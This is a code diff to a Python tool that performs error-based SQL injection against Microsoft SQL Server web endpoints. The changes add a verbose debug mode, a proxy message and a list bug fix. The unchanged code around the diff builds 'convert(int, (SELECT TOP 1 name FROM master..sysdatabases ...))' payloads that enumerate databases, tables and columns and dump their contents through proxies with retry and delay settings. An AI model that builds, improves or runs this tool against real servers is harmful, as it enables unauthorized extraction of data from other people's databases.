@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+from urllib.parse import unquote_plus as urldec
 from urllib.parse import quote_plus as urlenc
 from bs4 import BeautifulSoup as bs
 import requests
@@ -7,6 +8,8 @@ from time import sleep
 import argparse
 import sys
 import re
+
+verbose = False
 
 retry = 3
 wait_sec = 0.0
@@ -51,6 +54,11 @@ def gen_payload(source):
     return result
 
 
+def print_verbose(payload):
+    splitted = payload.split(left)[1].split(right)[0]
+    print(f"debug: {urldec(left + splitted + right)}", file=sys.stderr)
+
+
 def retr_loop(ses, url, header, payload1, payload2):
     result = []
     i = 0
@@ -58,8 +66,11 @@ def retr_loop(ses, url, header, payload1, payload2):
         for _ in range(retry):
             try:
                 not_in = ','.join([f"'{elem}'" for elem in result]) or "''"
+                payload = payload1 + urlenc(not_in) + payload2
+                if verbose:
+                    print_verbose(payload)
                 r = ses.post(url, timeout=timeout, headers=header,
-                             data=payload1 + urlenc(not_in) + payload2)
+                             data=payload)
                 content = return_contents(r)
                 result.append(content)
                 print(f"{i}: {content}")
@@ -79,8 +90,10 @@ def retr_database(ses, url, header, payload):
     base = [
         "convert(int, (SELECT TOP 1 name FROM master..sysdatabases WHERE name not in (", ")))"]
     print('databases:')
-    r = ses.post(url, timeout=timeout, headers=header,
-                 data=payload[0] + urlenc("convert(int, DB_NAME())") + payload[1])
+    payload3 = payload[0] + urlenc("convert(int, DB_NAME())") + payload[1]
+    if verbose:
+        print_verbose(payload3)
+    r = ses.post(url, timeout=timeout, headers=header, data=payload3)
     print(f"curent: {return_contents(r)}")
 
     payload1 = payload[0] + urlenc(base[0])
@@ -223,7 +236,7 @@ def retr_column_dic(raw_databases, raw_tables, raw_columns):
 def retr_proxy(raw_proxy):
     proto = args.proxy.split(':')[0]
     if not re.match(r'^socks5h?$|^https?$', proto):
-        print("error: invalid proxy", file=sys.stderr)
+        print(f"error: invalid proxy: {args.proxy}", file=sys.stderr)
         exit(1)
     return {'http': args.proxy, 'https': args.proxy}
 
@@ -237,10 +250,16 @@ def main():
 
     with requests.Session() as session:
         if method == 'POST':
+            if args.verbose:
+                global verbose
+                verbose = True
             if args.wait:
                 try:
                     global wait_sec
                     wait_sec = float(args.wait)
+                    if verbose:
+                        print(
+                            f"debug: wait sec set: {wait_sec}", file=sys.stderr)
                 except:
                     print(
                         f"error: cannot convert wait to float: -w {args.wait}", file=sys.stderr)
@@ -249,6 +268,8 @@ def main():
             if args.proxy:
                 proxy = retr_proxy(args.proxy)
                 session.proxies.update(proxy)
+                if verbose:
+                    print(f"debug: proxy set: {args.proxy}", file=sys.stderr)
 
             if args.database is None and args.table is None and args.column is None:
                 retr_database(session, url, header, payload)
@@ -263,13 +284,15 @@ def main():
                 raw_tables = retr_args(args.table)
                 if len(raw_databases) != len(raw_tables):
                     if len(raw_databases) == 1:
-                        raw_databases = raw_databases[0] * len(raw_tables)
+                        raw_databases = [raw_databases[0]] * len(raw_tables)
                     elif len(raw_tables) == 1:
-                        raw_tables = raw_tables[0] * len(raw_databases)
+                        raw_tables = [raw_tables[0]] * len(raw_databases)
                     else:
                         print('error: argument length is different',
                               file=sys.stderr)
                         exit(1)
+                print(raw_databases)
+                print(raw_tables)
                 tables = retr_table_dic(raw_databases, raw_tables)
                 databases = retr_database_list(raw_databases)
                 retr_columns(session, url, header,
@@ -322,10 +345,12 @@ if __name__ == '__main__':
         '-t', '--table', help='table from which you want to dump columns (comma separate (arg[/num][,arg[/num][, ...]]))')
     parser.add_argument(
         '-c', '--column', help='column from which you want to dump data (comma separate (arg[/num][,arg[/num][, ...]]))')
+    parser.add_argument('-v', '--verbose',
+                        help='verbose mode', action='store_true')
     parser.add_argument(
-        '-l', '--left', help='padding argument for left', required=True)
+        '-l', '--left', help='padding string for left', required=True)
     parser.add_argument(
-        '-r', '--right', help='padding argument for right', required=True)
+        '-r', '--right', help='padding string for right', required=True)
 
     args = parser.parse_args()
     left = urlenc(args.left)
